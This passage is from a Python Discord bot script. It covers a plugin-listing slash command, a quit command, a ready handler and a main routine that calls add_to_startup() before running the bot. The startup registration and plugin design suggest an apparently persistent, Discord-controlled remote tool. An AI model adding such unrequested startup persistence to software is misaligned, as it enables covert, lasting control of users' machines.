        async def plugin_list(interaction: discord.Interaction):
            await interaction.response.defer()

            plugins = []
            for file in os.listdir(PLUGIN_FOLDER):
                if file.endswith(".grataddin"):
                    plugins.append(file.replace(".grataddin", ""))

            if not plugins:
                await interaction.followup.send("⚠️ No plugins have been imported.")
                return

            embed = discord.Embed(
                title="📜 Imported Plugins",
                description="\n".join(f"- `{p}`" for p in sorted(plugins)),
                color=discord.Color.blue()
            )
            embed.set_footer(text=f"{len(plugins)} plugin(s) available.")
            await interaction.followup.send(embed=embed)

        @bot.tree.command(name="leave", description="Basically Quit")
        async def leave(interaction: discord.Interaction):
            quit()

        @bot.event
        async def on_ready():
            channel_id = 1272652399324041230  
            channel = bot.get_channel(channel_id)
            await bot.tree.sync()
            print([cmd.name for cmd in bot.tree.get_commands()])

            print(f"Logged in as {bot.user} and synced commands ✅")
            try:
                print(f"Bot is ready and commands are synced ✅. Logged in as {bot.user}.")
            except Exception as e:
                print(f"Error syncing commands: {e}")

        

        # Run bot
        async def main():
            async with bot:
                await bot.start(BOT_TOKEN)
                await bot.tree.sync()

        if __name__ == "__main__":
            add_to_startup()
            asyncio.run(main())
